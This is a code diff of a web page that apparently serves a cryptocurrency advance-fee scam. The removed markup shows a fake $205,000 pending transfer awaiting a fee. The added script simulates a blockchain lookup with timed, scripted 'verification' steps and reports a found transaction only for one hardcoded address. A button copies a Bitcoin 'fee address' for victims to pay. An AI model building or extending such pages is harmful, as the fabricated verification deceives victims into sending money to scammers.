-            <div class="flex justify-between items-center py-3 border-b border-white/5">
-                <span class="text-zinc-400">Transfer Amount</span>
-                <span class="font-mono text-lg">$205,000.00</span>
-            </div>
-            <div class="flex justify-between items-center py-3 border-b border-white/5">
-                <span class="text-zinc-400">Network Fee</span>
-                <span class="font-mono text-lg text-[#00D632]">$25.00</span>
-            </div>
-            <div class="flex justify-between items-center py-3">
-                <span class="text-white font-semibold">Total Pending</span>
-                <span class="font-mono text-xl font-bold text-[#00D632]">$205,000</span>
-            </div>
-        </div>
-        <div class="bg-zinc-900/50 p-4 rounded-xl flex items-start gap-3 border border-white/5">
-            <svg class="text-[#00D632] shrink-0" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
-            <p class="text-sm text-zinc-300">
-                Once the fee is cleared, funds are expected to be available in <span class="text-white font-semibold">5 minutes maximum</span>.
-            </p>
-        </div>
-        <button onclick="toggleDetails(false)" class="w-full mt-6 py-4 rounded-full bg-zinc-800 text-white font-semibold">Close</button>
     </div>
 
     <script>
-        function showView(viewId) {
-            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-            document.getElementById(viewId).classList.add('active');
-            window.scrollTo(0, 0);
+        const TARGET_ADDRESS = "35TSFGqY1ZEUgo6epfvkbJSh8ubg5r3kgJ";
+        const loadingSteps = ["Resolving Address...", "Querying Mempool...", "Verifying Signatures...", "Syncing with Nodes...", "Analyzing Transaction Graph...", "Finalizing Data..."];
+        let searchedAddress = "";
+
+        function generateSessionId() {
+            return Math.random().toString(36).substring(2, 8).toUpperCase();
         }
 
-        function toggleDetails(open) {
-            const panel = document.getElementById('details-panel');
-            const overlay = document.getElementById('details-overlay');
-            if (open) {
-                panel.classList.add('open');
-                overlay.classList.remove('hidden');
+        function handleSearch(event) {
+            event.preventDefault();
+            const address = document.getElementById('address-input').value.trim();
+            if (!address) return;
+            
+            searchedAddress = address;
+            document.getElementById('session-id').innerText = generateSessionId();
+            document.getElementById('home-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+            
+            // Reset progress
+            let progress = 0;
+            let step = 0;
+            const duration = 12000;
+            const interval = 100;
+            const increment = 100 / (duration / interval);
+            
+            document.getElementById('progress-bar').style.width = '0%';
+            document.getElementById('progress-percent').innerText = '0%';
+            document.getElementById('time-elapsed').innerText = '0.0';
+            document.getElementById('loading-text').innerText = loadingSteps[0];
+
+            const progressTimer = setInterval(() => {
+                progress += increment;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(progressTimer);
+                }
+                document.getElementById('progress-bar').style.width = progress + '%';
+                document.getElementById('progress-percent').innerText = Math.round(progress) + '%';
+                document.getElementById('time-elapsed').innerText = (progress * 0.12).toFixed(1);
+            }, interval);
+
+            const stepTimer = setInterval(() => {
+                step++;
+                if (step < loadingSteps.length) {
+                    document.getElementById('loading-text').innerText = loadingSteps[step];
+                } else {
+                    clearInterval(stepTimer);
+                }
+            }, 2000);
+
+            setTimeout(() => showResults(address), duration);
+        }
+
+        function showResults(address) {
+            document.getElementById('loading-screen').classList.add('hidden');
+            document.getElementById('results-screen').classList.remove('hidden');
+            document.getElementById('searched-address-display').innerText = address;
+            
+            if (address.toLowerCase() === TARGET_ADDRESS.toLowerCase()) {
+                document.getElementById('transaction-found').classList.remove('hidden');
+                document.getElementById('no-transaction').classList.add('hidden');
             } else {
-                panel.classList.remove('open');
-                overlay.classList.add('hidden');
+                document.getElementById('transaction-found').classList.add('hidden');
+                document.getElementById('no-transaction').classList.remove('hidden');
             }
         }
 
-        function copyText(text) {
-            navigator.clipboard.writeText(text);
-            alert('Copied to clipboard');
+        function goHome() {
+            document.getElementById('results-screen').classList.add('hidden');
+            document.getElementById('home-screen').classList.remove('hidden');
+            document.getElementById('address-input').value = '';
+        }
+
+        function copyAddress() {
+            navigator.clipboard.writeText(searchedAddress);
+            showToast('Address copied to clipboard');
+        }
+
+        function copyFeeAddress() {
+            navigator.clipboard.writeText('bc1qsgduvyhk8ywtta9qe5f0hrv4y0p8n5w8dx4gnx');
+            showToast('Fee address copied to clipboard');
+        }
+
+        function showToast(message) {
+            const toast = document.createElement('div');
+            toast.className = 'fixed bottom-6 right-6 bg-gray-900 text-white px-6 py-3 rounded-xl shadow-xl z-50 animate-pulse';
+            toast.innerText = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 2500);
         }
     </script>
 </body>
